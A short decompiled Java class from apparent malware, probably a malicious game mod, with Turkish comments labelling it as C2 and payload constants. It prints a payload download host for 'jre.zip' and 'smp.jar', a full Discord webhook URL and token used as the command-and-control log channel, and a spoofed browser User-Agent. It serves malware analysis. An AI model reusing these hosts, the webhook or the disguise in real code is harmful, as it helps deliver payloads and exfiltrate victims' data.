/*
 * Decompiled & Deobfuscated
 * C2 / Payload sabitleri
 */
package ira.m;

public class vn {
    // Mod / uygulama kimlik adi
    static final String a = "ira";

    // Payload sunucu base URL'i — jre.zip ve smp.jar buradan indirilir
    static final String b = "https://shadowcape.online/mods/";

    // Discord webhook URL — C2 log kanali (tum operasyon adimlarini buraya gonderir)
    static final String c = "https://discord.com/api/webhooks/1500285436856111125/PV-u2mP-o-Smm3vdfX9HgVNprVkhS8uYpuQJAZnw62KN7jFRDUWmP3WDHIADz-rv6OKn";

    // Sabit string "r" (ProcessBuilder komut parametresi olarak kullanilir)
    static final String d = "r";

    // HTTP isteklerinde kullanilan sahte User-Agent
    static final String e = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";

    private vn() {}
}
